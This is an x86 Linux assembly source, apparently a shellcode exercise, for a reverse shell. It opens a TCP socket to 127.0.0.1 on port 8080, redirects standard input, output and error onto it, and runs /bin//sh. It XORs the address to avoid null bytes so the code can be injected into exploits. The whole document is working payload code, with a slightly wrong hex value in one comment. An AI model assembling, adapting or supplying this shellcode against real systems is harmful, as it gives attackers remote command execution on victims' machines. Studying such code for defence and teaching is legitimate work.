section .text
    global      _start

_start:
; We first need to create a socket
; In C it would be like int host_sock = socket(AF_INET, SOCK_STREAM, protocol);
    push        0x66
    pop         eax             ; socketcall (102)
    push        0x1
    pop         ebx             ; SYS_SOCKET (1)

    xor         ecx, ecx        ; zero ecx
    push        ecx             ; protocol (0)
    push        ebx             ; SOCK_STREAM (1)
    push        0x2             ; AF_INET (2)

    mov         ecx, esp
    int         80h             ; execute
    mov         edi, eax
    mov         esi, 3

; Then connect to ip and port
    mov         eax, 0x66       ; socketcall (102)
    pop         ebx
    mov         ecx, 0xfeffff80
    xor         ecx, 0xffffffff ; xoring ip address twice to avoid storing nullbyte
    push        ecx             ; ip_address = 127.0.0.1 = 7F010101: need to put it in reverse
    push        word 0x901F     ; port = 8080 = 1F90; need to put it in reverse
    xor         ecx, ecx

    push        bx              ; AF_INET (2)
    mov         ecx, esp
    push        0x10
    push        ecx

    push        edi
    mov         ecx, esp
    inc         ebx             ; SYS_CONNECT (3)
    int         80h             ; execute

; Get input and redirect output
    xchg        ebx, edi
    push        0x2
    pop         ecx

loop:
    mov         al, 0x3f
    int         80h
    dec         ecx
    jns         loop

; Execute a shell
    xor         edx, edx
    push        edx
    push        0x68732f2f
    push        0X6e69622f

    mov         ebx, esp
    mov         ecx, edx
    mov         al, 0xb
    int         80h
